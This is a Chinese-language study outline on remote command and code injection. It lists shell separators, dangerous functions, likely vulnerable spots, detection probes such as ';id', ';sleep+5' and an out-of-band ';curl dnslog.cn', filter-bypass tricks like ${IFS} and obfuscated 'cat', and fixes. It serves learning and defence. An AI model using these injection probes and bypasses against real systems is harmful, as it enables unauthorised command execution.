# RCE 远程代码/命令执行 ## 命令执行 Command Injection - 原理 - 用户输入拼入系统命令 - 通过分隔符接上自己的命令 - 拼接符号 - Linux：; | \|\| && & \`\` \$() - Windows：& && \|\| | - 危险函数 - PHP：system() exec() shell\_exec() passthru() popen() - Python：os.system() os.popen() subprocess - Java：Runtime.exec() ProcessBuilder - 存在位置 - ping / traceroute / nslookup / whois - 压缩解压 / 图片处理（ImageMagick） - 邮件 sendmail / 备份 mysqldump / tar - 插件：Apache Nifi、Webmin、CMS 后台 ## 代码执行 Code Injection - 原理：用户输入直接当代码执行 - 危险函数 - PHP：eval() assert() preg\_replace/e create\_function() - Python：eval() exec() \_\_import\_\_() pickle.loads() - Java：OGNL / SpEL / MVEL / ScriptEngine - 存在位置 - 模板引擎 SSTI（Smarty / Twig / FreeMarker） - CMS 插件 / 主题编辑器 - 在线代码沙箱 - 反序列化（unserialize / pickle） - 数据库存储过程（xp\_cmdshell） ## 检测方法 - 白盒 - 搜索危险函数 - 参数污点追踪 - Semgrep / CodeQL - 黑盒：命令执行 - 延时探测：;sleep+5 - 回显探测：;id / ;whoami - 外带探测（无回显）：;curl dnslog.cn - 黑盒：代码执行 - 数学运算：print(1+1) - 函数探测：phpinfo() - 延时：sleep(5) ## 绕过手法 - 空格绕过 - \$\{IFS\} / IFS9 / \%09 / < / <> / \{\} - 关键词绕过 - cat→more/less/head/tail/tac - c\\\\at / /bin/c?t / ca''t - 分隔符绕过 - ; → \%0a 换行 / \%0d\%0a - \|\| / && / \$() - 编码混淆 - base64 / chr() / 拼接 / XOR ## 安全修复 - 代码层 - 白名单映射 + escapeshellarg - 禁用 eval / assert - 配置层 - disable\_functions - open\_basedir - 运行时 - 容器 / 沙箱隔离 - 最小权限 + seccomp / AppArmor - 网络隔离（限出口 IP） - 监控 - 异常命令检测 - 进程行为审计
